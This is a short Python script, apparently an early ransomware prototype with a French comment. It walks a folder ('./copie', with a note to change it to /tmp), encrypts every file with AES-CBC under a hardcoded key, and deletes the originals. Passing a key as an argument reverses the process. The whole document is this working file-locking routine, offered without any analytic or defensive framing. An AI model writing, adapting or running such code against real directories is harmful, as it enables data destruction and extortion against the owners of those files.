from Crypto.Cipher import AES
from Crypto import Random
import os
import random
import struct
import sys


def encryptFile(key, filename, out_filename=None, chunksize=64+1024):

    if not out_filename:
        out_filename = filename + '.enc'

    iv = Random.new().read(AES.block_size)

    encryptor = AES.new(key, AES.MODE_CBC, iv)
    filesize = os.path.getsize(filename)

    with open(filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)

            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - len(chunk)%16)

                outfile.write(encryptor.encrypt(chunk))


def decryptFile(key, filename, out_filename=None, chunksize=24*1024):

    if not out_filename:
        out_filename = filename[:-4]

    with open(filename, 'rb') as infile:
        origsize = struct.unpack('<Q', infile.read(struct.calcsize('Q')))[0]
        iv = infile.read(16)
        decryptor = AES.new(key, AES.MODE_CBC, iv)

        with open(out_filename, 'wb') as outfile:
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                outfile.write(decryptor.decrypt(chunk))

            outfile.truncate(origsize)


def main(argv):

    # a changer en /tmp
    baseUrl = './copie'
    key = b"3CC5DBACEFB9D865"

    is_decrypt = None

    if len(argv) > 1:
        is_decrypt = True
        key = bytes(argv[1], 'utf-8')


    for root, dirs, files in os.walk(baseUrl, topdown=False):
       for name in files:
            file = os.path.join(root, name)
            print(file)

            # decrypt
            if is_decrypt:
                if file[-4:] == ".enc":
                    print("[*] Decrypting... ")
                    decryptFile(key, file)
                    os.remove(file)
            # encrypt
            else:
                if file[-4:] != ".enc":
                    print("[*] Encrypting... ")
                    encryptFile(key, file)
                    os.remove(file)


if __name__ == '__main__':
    main(sys.argv)